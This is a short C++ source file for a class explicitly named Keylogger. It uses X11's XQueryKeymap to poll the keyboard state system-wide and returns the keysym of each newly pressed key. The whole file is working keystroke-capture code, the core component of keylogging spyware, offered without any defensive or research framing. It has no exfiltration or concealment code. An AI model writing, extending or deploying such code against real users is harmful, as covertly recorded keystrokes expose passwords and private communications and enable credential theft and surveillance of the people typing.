#include "Keylogger.hh"

Keylogger::Keylogger() : device_(XOpenDisplay(NULL)), keymap_{0}, keymapOld_{0}
{
}

Keylogger::~Keylogger()
{
	XCloseDisplay(device_);
}

char 			Keylogger::checkLinux()
{
	char		keyPressed(0);

	XQueryKeymap(device_, keymap_);
	if(memcmp(keymap_, keymapOld_, 32))
	{
		for(unsigned int i = 0; i < sizeof(keymap_); i++)
		{
			curKey_ = keymap_[i];
			curKeyOld_ = keymapOld_[i];
			check_ = 1;
			for (int j = 0; j < 8; j++)
			{
				if ((curKey_ & check_) && !(curKeyOld_ & check_))
				{
					keyCode_ = i * 8 + j;
					keyPressed = XKeycodeToKeysym(device_, keyCode_, 0);
				}
			   check_ = check_ << 1;
			}
	   }
   }
   memcpy(keymapOld_, keymap_, 32);
   return keyPressed;
}
